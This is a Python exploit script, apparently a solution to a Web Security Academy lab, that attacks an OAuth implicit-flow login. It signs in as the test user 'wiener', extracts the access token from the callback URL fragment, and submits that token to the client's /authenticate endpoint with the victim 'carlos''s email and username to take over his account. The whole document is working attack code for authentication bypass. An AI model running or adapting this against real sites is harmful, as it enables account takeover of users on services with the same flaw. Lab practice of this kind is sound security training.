import requests
from bs4 import BeautifulSoup
import re

site = 'ac461f191ebe6cc5c027649d00ee0071.web-security-academy.net'
s = requests.Session()
login_url = f'https://{site}/social-login'

if __name__ == "__main__":
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    meta = soup.find('meta', {'http-equiv':'refresh'})
    print(f'Meta tag is: {meta}')

    auth_url = meta['content'].split(';')[1].lstrip('url=')
    print(f'Authorization URL is: {auth_url}')
    oauth_site = auth_url.split('/')[2]
    print(f'Identity provider site is: {oauth_site}')

    resp = s.get(auth_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    login = soup.find('form')
    login_url = f"https://{oauth_site}{login['action']}"
    print(f'Sign-in URL is: {login_url}')
    login_data = {
        'username': 'wiener',
        'password': 'peter'
    }
    resp = s.post(login_url, data=login_data)
    soup = BeautifulSoup(resp.text, 'html.parser')
    cont = soup.find('form')
    cont_url = f"https://{oauth_site}{cont['action']}"
    print(f'Continue URL is: {cont_url}')

    resp = s.post(cont_url, allow_redirects=False)
    redir_url_1 = resp.headers["Location"]
    print(f'First redirection back to authorization URL: {redir_url_1}')
    resp = s.get(redir_url_1, allow_redirects=False)
    redir_url_2 = resp.headers["Location"]
    print(f'Second redirection back to callback URL of client application containing token: {redir_url_2}')
    token = re.split('[#&]', redir_url_2)[1].split('=')[1]
    print(f'Token in oauth-callback is {token}')

    resp = s.get(redir_url_2)
    print(f'Callback URL response returns: {resp.text}')

    resp = s.get(redir_url_2)
    print(f'Javascript contains: {resp.text}')

    me_url = f'https://{oauth_site}/me'
    me_headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    resp = s.get(me_url, headers=me_headers)
    print(f'/me gets user information: {resp.text}')

    authenticate_url = f'https://{site}/authenticate'
    authenticate_data = {
        'email': 'carlos@carlos-montoya.net',
        'username': 'carlos',
        'token': token
    }
    authenticate_headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
    resp = s.post(authenticate_url, json=authenticate_data, headers=authenticate_headers)
    print(resp.text)
